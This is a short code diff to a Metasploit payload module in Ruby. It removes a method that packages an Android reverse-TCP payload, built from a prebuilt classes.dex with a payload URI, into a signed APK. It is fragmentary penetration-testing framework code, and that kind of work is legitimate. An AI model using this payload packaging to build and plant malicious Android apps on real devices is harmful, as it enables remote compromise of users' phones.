@@ -39,26 +39,4 @@ module MetasploitModule
     transport_config_reverse_tcp(opts)
   end
 
-  def generate_jar(opts={})
-    jar = Rex::Zip::Jar.new
-
-    classes = MetasploitPayloads.read('android', 'apk', 'classes.dex')
-    apply_options(classes, opts, payload_uri)
-
-    jar.add_file("classes.dex", fix_dex_header(classes))
-
-    files = [
-      [ "AndroidManifest.xml" ],
-      [ "resources.arsc" ]
-    ]
-
-    jar.add_files(files, MetasploitPayloads.path("android", "apk"))
-    jar.build_manifest
-
-    cert, key = generate_cert
-    jar.sign(key, cert, [cert])
-
-    jar
-  end
-
 end
